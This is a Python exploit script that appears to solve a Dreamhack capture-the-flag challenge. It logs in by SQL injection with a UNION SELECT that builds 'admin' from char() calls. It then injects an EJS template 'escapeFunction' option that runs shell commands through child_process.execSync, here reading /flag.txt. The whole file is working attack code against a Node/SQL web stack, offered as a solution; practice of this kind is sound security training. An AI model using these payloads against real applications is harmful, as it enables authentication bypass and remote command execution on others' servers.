from requests.sessions import Session

url = "http://host1.dreamhack.games:11156"

s = Session()
s.post(url+"/user/login", data={"0":"","1":"","2":"union select char(97)||char(100)||char(109)||char(105)||char(110),char(97)||char(100)||char(109)||char(105)||char(110);"})

cmd = "cat /flag.txt"

res = s.get(url+"/preview", params={"content":"exploit","settings[view options][client]":"true","settings[view options][escapeFunction]":"1;return global.process.mainModule.constructor._load('child_process').execSync('"+cmd+"');"})

print(res.text)